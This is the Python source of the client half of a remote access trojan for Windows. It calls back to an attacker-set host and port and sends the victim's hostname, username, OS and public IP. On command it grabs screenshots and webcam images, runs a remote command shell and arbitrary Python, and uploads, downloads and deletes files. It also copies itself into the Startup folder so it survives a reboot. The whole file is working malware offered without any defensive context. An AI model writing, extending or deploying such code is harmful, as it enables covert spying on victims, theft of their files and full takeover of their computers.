import socket, subprocess, os, platform, time, sys, pyscreeze, urllib.request, cv2, shutil
from io import StringIO

# Socket Properties
HOST = ""
PORT = 3000

# Defines (Send & Recv) Functions for use
send = lambda data: objSocket.send(data)
recv = lambda buffer: objSocket.recv(buffer)

# Client Properties
appdata = os.environ["APPDATA"]
username = os.getlogin()
system = platform.system() + " " + platform.release()
try:
    Public_IP = urllib.request.urlopen("https://ident.me", timeout=30).read()
except (urllib.error.URLError, Exception):
    Public_IP = b"unknown"

def main():
    global objSocket

    while (True):
        try:
            objSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            objSocket.connect((HOST, PORT))
        except (socket.error, Exception):
            time.sleep(4)
        else:
            break

    send(objSocket.getsockname()[0].encode() + b" " + socket.gethostname().encode() + b" " + username.encode() + \
         b" " + system.encode() + b" " + Public_IP)

main()

def MessageBox(message):
    with open(appdata+"/msg.vbs", "w") as VBS_MsgBox:
        VBS_MsgBox.write(f"MsgBox \"{message}\", 64, \"[Message]\""); VBS_MsgBox.close()

    subprocess.Popen(["cscript.exe", appdata+"/msg.vbs"], shell=True)
    send(b"(Message Sent)"); time.sleep(1); os.remove(appdata+"/msg.vbs")

def OpenWebpage(url):
    if (url == "append-connection"):
        return

    subprocess.Popen("start " + url, shell=True); send(b"[Webpage Opened]")

def Screenshot():
    try:
        pyscreeze.screenshot(appdata+"/screenshot.png"); send(b"success"); time.sleep(1); send(str(os.path.getsize(appdata+"/screenshot.png")).encode()); time.sleep(0.2)
        with open(appdata+"/screenshot.png", "rb") as ImageFile:
            send(ImageFile.read())

        os.remove(appdata+"/screenshot.png")
    except:
        send(b"error")

def Webcam():
    try:
        webcam = cv2.VideoCapture(0)
        return_value, image = webcam.read()
        cv2.imwrite(appdata+"/webcam.png", image)
        del(webcam); send(b"success"); time.sleep(0.5)

        send(str(os.path.getsize(appdata+"/webcam.png")).encode()); time.sleep(0.2)
        with open(appdata+"/webcam.png", "rb") as ImageFile:
            send(ImageFile.read())

        os.remove(appdata+"/webcam.png")

    except (cv2.error, Exception):
        send(b"error")

def StartProcess(process):
    if not (os.path.isfile(process)):
        send(b"INVALID")
        return

    send(b"VALID"); os.system("start " + process)

def PythonInterpreter():
    ServerCode = recv(1024).decode()
    if (ServerCode == "not-sending"):
        return

    Redirected_Output = sys.stdout = StringIO()

    try:
        exec(ServerCode); send("SUCCESS".encode()); send(Redirected_Output.getvalue().encode())
    except SyntaxError as se:
        send(f"Syntax Error: ({se})".encode())
    except NameError as ne:
        send(f"Name Error: ({ne})".encode())
    except TypeError as te:
        send(f"Type Error: ({te})".encode())
    except OSError as oe:
        send(f"OS Error: ({oe})".encode())
    except OverflowError as ofe:
        send(f"Overflow Error: ({ofe})".encode())
    except Exception as e:
        send(f"Error: ({e})".encode())
    else:
        send(b"<No Output>")

def RemoteCMD():
    CurrentDirectory = os.getcwd()
    send(CurrentDirectory.encode())

    while (True):
        ServerInput = recv(1024).decode()
        if (ServerInput == "close-cmd"):
            break

        elif (len(ServerInput) > 0):
            CMD_Command = subprocess.Popen(ServerInput, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
            CMD_Output = CMD_Command.stdout.read() + CMD_Command.stderr.read()
            OutputData = (CMD_Output + b"\n")
        else:
            OutputData = b"Error Occured"

        send(OutputData)

def RegisterStartup():
    try:
        shutil.copyfile(f"{__file__.split('.')[0]}.exe", f"C:/Users/{username}/AppData/Roaming/Microsoft/Windows/" + \
                                f"Start Menu/Programs/Startup/{__file__.split('.')[0]}.exe")
        send(b"(Registered to Startup)")
    except (FileNotFoundError, OSError, Exception):
        send(b"(Error Registering to Startup)")

def RemoveStartup():
    with open(appdata+"/del.vbs", "w") as DelFile:
        DelFile.write("Set del = CreateObject(\"Scripting.FileSystemObject\")\ndel.DeleteFile(\""
                       f"C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/{__file__.split('.')[0]}.exe\")")
        DelFile.close()

    subprocess.Popen(["cscript.exe", appdata+"/del.vbs"], shell=True)
    send(b"(Removed from Startup)"); time.sleep(1); os.remove(appdata+"/del.vbs")

def ViewFiles():
    drives = [chr(x) + ":/" for x in range(65,91) if os.path.isdir(chr(x) + ":/")]
    send(" ".join(drives).encode())

    directory = recv(1024).decode()
    if not (os.path.isdir(directory)):
        send(b"INVALID")
        return

    send(b"VALID"); send(str(len(os.listdir(directory))).encode()); time.sleep(0.1); send("\n".join(os.listdir(directory)).encode())

def ReceiveFile(basename, bytesize):
    with open(appdata+"/"+basename, "wb") as file:
        file.write(recv(int(bytesize)))

    send(b"(File Sent)")

def SendFile(file):
    if not (os.path.isfile(file)):
        send(b"error"); return

    send(b"success"); send(os.path.basename(file).encode()); time.sleep(0.2); send(str(os.path.getsize(file)).encode())
    with open(file, "rb") as file:
        send(file.read())

def Delete():
    ServerInput = recv(1024).decode()
    if (ServerInput == "del-file"):
        file = recv(1024).decode()
        if (os.path.isfile(file)):
            send(b"success"); os.remove(file)
        else:
            send(b"error")

    elif (ServerInput == "del-dir"):
        directory = recv(1024).decode()
        if (os.path.isdir(directory)):
            send(b"success"); shutil.rmtree(directory, ignore_errors=True)
        else:
            send(b"error")

    elif (ServerInput == "error"):
        return

while (True):
    try:
        ServerCommand = recv(1024).decode()
        if (ServerCommand == "close-connection"):
            objSocket.close(); del(objSocket); break
        elif (ServerCommand == "append-connection"):
            objSocket.close(); del(objSocket); main()
        elif (ServerCommand == "test"):
            continue
        elif (ServerCommand == "message-box"):
            MessageBox(recv(4096).decode())
        elif (ServerCommand == "open-webpage"):
            OpenWebpage(recv(1024).decode())
        elif (ServerCommand == "capture-screenshot"):
            Screenshot()
        elif (ServerCommand == "capture-webcam"):
            Webcam()
        elif (ServerCommand == "start-process"):
            StartProcess(recv(1024).decode())
        elif (ServerCommand == "python-interpreter"):
            PythonInterpreter()
        elif (ServerCommand == "remote-cmd"):
            RemoteCMD()
        elif (ServerCommand == "startup"):
            RegisterStartup()
        elif (ServerCommand == "rmv-startup"):
            RemoveStartup()
        elif (ServerCommand == "shutdown-pc"):
            send(b"Powering Off"); # os.system("shutdown /p")
        elif (ServerCommand == "restart-pc"):
            send(b"Computer Restarting"); # os.system("shutdown /r")
        elif (ServerCommand == "lock-pc"):
            send(b"Computer Locked"); # os.system("rundll32.exe user32.dll,LockWorkStation")
        elif (ServerCommand == "current-dir"):
            send(os.getcwd().encode());
        elif (ServerCommand == "view-files"):
            ViewFiles()
        elif (ServerCommand == "send-file"):
            ReceiveFile(basename=recv(1024).decode(), bytesize=recv(1024).decode())
        elif (ServerCommand == "receive-file"):
            SendFile(file=recv(1024).decode())
        elif (ServerCommand == "delete"):
            Delete()

    except (socket.error, Exception):
        objSocket.close(); del(objSocket); main()
